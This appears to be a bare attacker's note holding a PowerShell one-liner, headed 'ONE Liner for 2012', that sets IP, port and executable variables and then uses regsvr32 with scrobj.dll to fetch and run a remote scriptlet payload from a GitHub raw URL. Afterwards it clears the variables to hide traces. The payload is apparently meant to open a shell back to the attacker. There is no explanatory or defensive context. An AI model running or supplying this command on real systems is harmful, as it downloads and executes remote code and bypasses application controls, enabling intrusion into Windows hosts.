#ONE Liner for 2012
"powershell"
$env:IP="10.40.10.50"; $env:PORT="8080"; $env:EXE="shell.exe"; regsvr32 /s /n /u /i:https://raw.githubusercontent.com/USER/REPO/main/payload.sct scrobj.dll; [Environment]::SetEnvironmentVariable("IP",$null,"Process"); [Environment]::SetEnvironmentVariable("PORT",$null,"Process"); [Environment]::SetEnvironmentVariable("EXE",$null,"Process")
"powershell"
